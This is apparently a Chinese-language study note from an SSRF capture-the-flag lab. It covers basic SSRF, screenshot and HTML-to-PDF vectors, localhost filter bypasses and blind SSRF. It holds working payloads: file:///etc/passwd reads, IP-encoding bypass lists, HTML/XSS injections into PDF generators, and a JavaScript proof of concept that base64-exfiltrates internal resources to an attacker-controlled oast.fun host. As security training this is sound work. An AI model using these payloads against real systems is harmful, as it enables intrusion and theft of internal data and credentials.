#ssrf
## 基础
### SSRF Basic

- https://ariadne.ctfio.com/basic

1. 访问页面 ，为View the source of any website
```bash
┌──(kali㉿kali)-[~]
└─$ curl  https://ariadne.ctfio.com/basic 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
<div class="container" style="padding-top:60px;">

    <h1 class="text-center">Source Code Tool</h1>
    <h3 class="text-center">View the source of any website</h3>

    <div class="row" style="margin-bottom: 20px">
        <div class="col-md-6 col-md-offset-3">
                        <div class="row">
                <form method="post">
                    <div class="col-xs-9">
                        <input name="url" class="form-control">
                    </div>
                    <div class="col-xs-3">
                        <input type="submit" class="btn btn-success" value="Go">
                    </div>
                </form>
            </div>
        </div>
    </div>

    <textarea class="form-control" rows="30"></textarea>
</div>
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
</body>
</html>
```
2. 尝试获取 外网 https://www.baidu.com 发现请求成功 
```
POST /basic undefined
Host: ariadne.ctfio.com
.........


url=https%3A%2F%2Fwww.baidu.com


HTTP/1.1 200 OK
Server: nginx/1.22.0 (Ubuntu)
Date: Wed, 29 Oct 2025 10:37:23 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
<div class="container" style="padding-top:60px;">

    <h1 class="text-center">Source Code Tool</h1>
    <h3 class="text-center">View the source of any website</h3>

    <div class="row" style="margin-bottom: 20px">
        <div class="col-md-6 col-md-offset-3">
                        <div class="row">
                <form method="post">
                    <div class="col-xs-9">
                        <input name="url" class="form-control">
                    </div>
                    <div class="col-xs-3">
                        <input type="submit" class="btn btn-success" value="Go">
                    </div>
                </form>
            </div>
        </div>
    </div>

    <textarea class="form-control" rows="30"><!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta content="always" name="referrer" />
    <meta
        name="description"
        content="全球领先的中文搜索引擎、致力于让网民更便捷地获取信息，找到所求。百度超过千亿的中文网页数据库，可以瞬间找到相关的搜索结果。"
    />
    <link rel="shortcut icon" href="//www.baidu.com/favicon.ico" type="image/x-icon" />
    <link
    ......
```
3. 请求`http://127.0.0.1`  成功 
	1. http://127.0.0.1:8080 成功
	2. file:///etc/passwd  
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
```

### 网站截图 / 网站转换为PDF
> 很多服务 都有可能存在漏洞， 网站截图，获取网站资源，图片编辑器，视频编辑器等可以导入外部资源的地方都可能存在SSRF
1. 发现网页有截图功能（HTML转为PDF等）,使用https://bpjonsjopuamfpeycdiowg0hl0b2fjvok.oast.fun
```html
    <h1 class="text-center">Screenshot Tool</h1>
    <h3 class="text-center">Take a screenshot of any website</h3>

    <div class="row" style="margin-bottom: 20px">
        <div class="col-md-6 col-md-offset-3">
                        <div class="row">
                <form method="post">
                    <div class="col-xs-9">
                        <input name="url" class="form-control" placeholder="https://www.example.com">
                    </div>
                    <div class="col-xs-3">
                        <input type="submit" class="btn btn-success" value="Go">
                    </div>
                </form>
            </div>
        </div>
    </div>
        <div class="text-center"><a href="/data/a0d832c64a8070b1d176945ee803b72e.jpg" target="_blank">Download Screenshot</a></div>
```
2. 查看Http请求,发现存在低版本chrome ，可以打一下chrome rce ⭐⭐
	1. https://mp.weixin.qq.com/s/hj8mv_GHr2o7ysQvFDs8UA  
```
GET / HTTP/2.0
Host: bpjonsjopuamfpeycdiowg0hl0b2fjvok.oast.fun
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.165 Safari/537.36
```
3. 响应头中 有时会包含API KEY



## Bypass


### Localhost Blacklist
```bash
http://127.0.0.1
http://localhost

http://127.1     --- bypass 过滤： 数字.数字.数字.数字
http://127.0.1
http://127.0.0.0
http://127.000.000.001

http://0
http://[::1]     -- IPv6 
http://2130706433 (Decimal for 127.0.0.1)
http://0177.0.0.1 (Octal for 127.0.0.1)
http://0x7f000001 (Hexadecimal for 127.0.0.1)

http://localhost.hiroki.com --- cname 127.0.0.1 （也可以使用nip.io 但是有些公司会封掉）

http://127。0。0。1/   --- 非标准分隔符 
```
- nip.io 有些公司会封掉 ![](media/Pasted%20image%2020251030194511.png) ![](media/Pasted%20image%2020251030194658.png)
	- <任意字符>.<本地地址>.nip.io![](media/Pasted%20image%2020251030195054.png)  
	- 127-0-0-1.nip.io![](media/Pasted%20image%2020251030195027.png)  
  
### Localhost Whitelist

```bash
只允许hiroki.com

有可能匹配 
	1. 是否存在 hiroki.com --> 
		   hiroki.com.hiroki.com   cname 127.0.0.1
		   hiroki.com.127.0.0.1.nip.io
		   hiroki.com@attacker.com  cname 127.0.0.1 (有时候会限制为https://www.hiroki.com 开头)
		   
	2. 是否以 hiroki.com结尾 -->
		   127.0.0.1/hiroki.com
		   127.0.0.1/https://www.hiroki.com
	3. 强制限制https://www.hiroki.com 而且匹配很严谨
		   - 找url跳转：https://www.hiroki.com/?redirect_url=https://www.attacker.com
		   - 文件上传: https://www.hiroki.com/?file=file:///etc/passwd
					https://www.hiroki.com/?file=http://127.0.0.1:8080
```



## 总结
1. 测试**对外请求**，要看 请求完整信息,原因如下 : 
	1. https://oast.fun ⭐多用 ![](media/Pasted%20image%2020251029191744.png)
	2. [Java/Kotlin使用chrome无头浏览器](https://blog.csdn.net/qq_44684238/article/details/145533518)   开发者角度 
```bash
Header ： 组件CVE --- Chrome Rce 
	https://mp.weixin.qq.com/s/hj8mv_GHr2o7ysQvFDs8UA -- chrome rce
	https://corben.io/blog/18-12-5-XSS-to-XXE-in-Prince -- Prince XXE
	
其他请求头：可能泄露API KEY
```
2. **常用协议**
```bash
http://

file:///etc/passwd #读取文件

dict://127.0.0.1:8080 #探测端口
```
3. **盲SSRF**
	1. `时间` 来验证 存在盲ssrf
		1. https://www.baidu.com time 0.1s
		2. https://10.0.0.1 time 5s or more 可能这里没服务，但是验证我们可以访问内网
		3. https://10.0.0.1:8080 time 0.1s 内网这里有服务
	2. 我们自己服务器 `bind-ssrf.html` 
		1. 先测试 能不能执行 js ：`<script>window.location="https://xxxx.oast.fun"<script>` 
		2. POC : `exfil = new XMLHttpRequest(); exfil.open("GET",https://受害者.com/flag.txt); exfil.send(); exfil.onload = function() {document.write(<img src="https://xxxx.oast.fun/x?x=" + btoa(this.responseText)+ '">'); }`     
			1. `受害者.com/flag.txt` --> `内网资源 / 云元数据 / jenkins`等
			2. 无头浏览器 ---> http / https 要一致
4. **常见场景**
	1. 网站请求
	2. 网页截图 / 外部网站 HTML转PDF  ⭐
	3. **导入外部资源**（外部图片编辑 / 视频编辑 ）等等
		1. 比如修改头像 ： 有时候限制img类型 ，
			1. 我们可以通过响应时间来判断能否访问内网
			2. 还有一种办法就是 `https://10.10.0.1/favicon.ico` ,利用服务器本身存在的img（可以爆破 端口和 ip）
			3. ~~有时候我们可以 第一次head 为img类型，然后第二次跳转到我们的服务器去读内容之类的~~
	4. 生成PDF（根据购买/个人信息生成发票） --->  ⭐ 注意和2的区别 ,一个是讲外部导入的html转换为pdf，一个是将信息打印成pdf 
		1. **HTML注入**： 修改信息 ，看是否存在`<h1>231028</h1>` 看是否渲染 ![](media/Pasted%20image%2020251030212350.png)
			1. 我们可以 尝试利用 尝试ssrf `<img src="https://xxxx.oast.fun">`  先看看是否有请求，
			2. 确定有请求，再看是否能访问内网 `<iframe src="https://127.0.0.1:8080">`
		2. **XSS注入**  ： 先使用`<script>document.write(document.location)</script>`  确定环境 
			1. Http环境： 如果把链接打印到pdf中，这是Http环境![](media/Pasted%20image%2020251030204431.png)     `<script>window.location="http://127.0.0.1"</script>`  ![](media/Pasted%20image%2020251030204318.png)
			2. File环境：如果把文件位置打印到pdf中 ，则是file环境  ![](media/Pasted%20image%2020251030204513.png) `<script>window.location="file"///etc/passwd"</script>`    ![](media/Pasted%20image%2020251030204655.png)  

- [SSRF漏洞技术深度剖析](https://xz.aliyun.com/news/18104) 